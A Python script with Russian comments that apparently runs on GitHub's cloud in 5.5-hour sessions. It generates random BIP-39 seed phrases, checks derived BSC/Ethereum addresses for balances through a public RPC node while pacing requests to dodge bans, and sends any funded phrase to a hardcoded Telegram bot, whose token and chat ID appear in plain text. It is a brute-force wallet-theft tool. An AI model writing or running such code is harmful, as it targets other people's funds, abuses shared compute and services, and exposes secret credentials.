import time
import requests
from eth_account import Account
from mnemonic import Mnemonic

# Твои данные (проверь, чтобы не было пробелов)
TELEGRAM_TOKEN = "8343501600:AAEO_yNSy1xLZdJ_tLlaazzteQvIvZeIAvQ"
TELEGRAM_CHAT_ID = "1632903931"

Account.enable_unaudited_hdwallet_features()
mnemo = Mnemonic("english")

# Настройка времени (чтобы уложиться в лимит GitHub)
START_TIME = time.time()
WORK_LIMIT = 5.5 * 3600 # Работаем 5 часов 30 минут

def send_telegram(msg):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": msg, "parse_mode": "Markdown"}, timeout=10)
    except:
        pass

def hunt():
    # Отправляем инфо в телегу при каждом новом запуске
    send_telegram("🛰 *Охота продолжается!* \n\nБот запустил новую сессию в облаке.\nЗапланированное время работы: *5.5 часов*.\nСеть: *BSC/Ethereum*.")
    
    count = 0
    while True:
        # Проверка: если время вышло, вежливо выходим
        if time.time() - START_TIME > WORK_LIMIT:
            send_telegram("⏳ *Сессия завершена.* \nБот уходит на короткую паузу перед перезапуском.")
            break

        # Генерация фразы
        words = mnemo.generate(strength=128)
        acct = Account.from_mnemonic(words)
        
        # Проверка баланса раз в 30 попыток (оптимально для скорости и обхода банов)
        if count % 30 == 0:
            try:
                res = requests.post('https://bsc-dataseed.binance.org/', 
                                    json={"jsonrpc":"2.0","method":"eth_getBalance","params":[acct.address, "latest"],"id":1}, 
                                    timeout=5).json()
                balance = int(res['result'], 16)
                if balance > 0:
                    msg = f"💰 *ЕСТЬ КОНТАКТ! НАЙДЕН БАЛАНС!* 💰\n\nФраза: `{words}`\nАдрес: `{acct.address}`"
                    send_telegram(msg)
            except:
                pass
        
        count += 1
        # Лог в консоль GitHub раз в 1000 проверок
        if count % 1000 == 0:
            print(f"Проверено: {count} кошельков...")

if __name__ == "__main__":
    hunt()
